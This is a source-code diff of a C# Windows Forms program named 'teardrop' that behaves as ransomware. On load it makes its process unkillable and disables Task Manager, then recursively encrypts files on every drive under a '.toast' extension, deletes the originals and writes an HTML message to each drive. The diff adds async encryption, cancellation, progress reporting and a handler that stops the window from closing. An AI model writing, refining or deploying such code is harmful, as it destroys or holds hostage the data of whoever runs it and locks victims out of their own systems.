@@ -2,9 +2,12 @@ namespace teardrop
 {
     public partial class FrmMain : Form
     {
+        private IProgress<string> notification;
         private static string generatedKey = string.Empty;
         private const string defaultExtension = ".toast";
         private const string defaultMessage = "<h1>Title:</h1><p>Message</p>";
+        CancellationTokenSource _cancellationTokenSource;
+
         private enum CypherMode
         {
             Encode,
@@ -35,6 +38,8 @@ namespace teardrop
         public FrmMain()
         {
             InitializeComponent();
+            notification = new Progress<string>(WriteLine);
+            _cancellationTokenSource = new CancellationTokenSource();
         }
 
         private void Setup()
@@ -44,7 +49,6 @@ namespace teardrop
             ProcessManager.ProcessUnkillable();
             MachineManager.DisableTaskManager();
         }
-
 
         private void GenerateKeys()
         {
@@ -56,13 +60,12 @@ namespace teardrop
             Text = CryptoManager.GetRandomString(64);
         }
 
-
         public void WriteLine(string text)
         {
             txtBox.Text += $"{text}{Environment.NewLine}";
         }
 
-        private void ChangeAllFiles(string rootPath, CypherMode mode)
+        private async Task ChangeAllFilesAsync(string rootPath, CypherMode mode, IProgress<string> notification, CancellationToken cancellationToken)
         {
             try
             {
@@ -84,9 +87,9 @@ namespace teardrop
 
                                     newFilePath = FileManager.AddExtension(filePath, defaultExtension);
 
-                                    CryptoManager.EncodeFile(filePath, newFilePath, defaultKey);
+                                    await CryptoManager.EncodeFileAsync(filePath, newFilePath, defaultKey, cancellationToken);
 
-                                    WriteLine($@"Encrypted {filePath}");
+                                    notification.Report($@"Encrypted {filePath}");
 
                                     RemoveFile(filePath);
                                     break;
@@ -96,9 +99,9 @@ namespace teardrop
 
                                     newFilePath = FileManager.RemoveExtension(filePath, defaultExtension);
 
-                                    CryptoManager.DecodeFile(filePath, newFilePath, defaultKey);
+                                    await CryptoManager.DecodeFileAsync(filePath, newFilePath, defaultKey, _cancellationTokenSource.Token);
 
-                                    WriteLine($"Decrypted {filePath}");
+                                    notification.Report($"Decrypted {filePath}");
 
                                     RemoveFile(filePath);
                                     break;
@@ -107,13 +110,13 @@ namespace teardrop
                             }
                         }
 
-                        ChangeAllFiles(directory, mode);
+                        await ChangeAllFilesAsync(directory, mode, notification, cancellationToken);
                     }
                 }
             }
             catch (Exception ex)
             {
-                WriteLine(ex.Message);
+                notification.Report(ex.Message);
             }
         }
 
@@ -139,46 +142,54 @@ namespace teardrop
             }
         }
 
-        private void ManageDrives(CypherMode mode)
+        private async Task ManageDrivesAsync(CypherMode mode, IProgress<string> notification, CancellationToken cancellationToken)
         {
             foreach (DriveInfo drive in DriveInfo.GetDrives())
             {
-                ChangeDrive(drive, mode);
+                await ChangeDriveAsync(drive, mode, notification, cancellationToken);
             }
         }
 
-        private void ChangeDrive(DriveInfo drive, CypherMode mode)
+        private async Task ChangeDriveAsync(DriveInfo drive, CypherMode mode, IProgress<string> notification, CancellationToken cancellationToken)
         {
-            WriteLine($@"Found drive {drive.Name}");
+            notification.Report($@"Found drive {drive.Name}");
 
             try
             {
                 if (!drive.IsReady) throw new AccessViolationException("Drive is not ready.");
 
-                ChangeAllFiles(drive.Name, mode);
+                await ChangeAllFilesAsync(drive.Name, mode, notification, cancellationToken);
 
                 FileManager.WriteHtmlFile(drive.Name, defaultMessage);
 
             }
             catch (Exception ex)
             {
-                WriteLine($@"Found drive {drive.Name}, but it's not ready. adicional info: {ex.Message}");
+                notification.Report($@"Found drive {drive.Name}, but it's not ready. adicional info: {ex.Message}");
             }
         }
 
-        private void FrmMain_Load(object sender, EventArgs e)
+        private async void FrmMain_Load(object sender, EventArgs e)
         {
             Setup();
-            ManageDrives(CypherMode.Encode);
+            //await ChangeAllFilesAsync("C:/testDir", CypherMode.Encode, notification, _cancellationTokenSource.Token);
+            //await ChangeAllFilesAsync("C:/testDir", CypherMode.Decode, notification, _cancellationTokenSource.Token);
+
+            await ManageDrivesAsync(CypherMode.Encode, notification, _cancellationTokenSource.Token);
         }
 
-        private void BtnDecode_Click(object sender, EventArgs e)
+        private void FrmMain_FormClosing(object sender, FormClosingEventArgs e)
+        {
+            e.Cancel = true;
+        }
+
+        private async void BtnDecode_Click(object sender, EventArgs e)
         {
             if (string.IsNullOrEmpty(txtKey.Text.Trim())) return;
 
             generatedKey = txtKey.Text;
 
-            ManageDrives(CypherMode.Decode);
+            await ManageDrivesAsync(CypherMode.Decode, notification, _cancellationTokenSource.Token);
         }
     }
 }
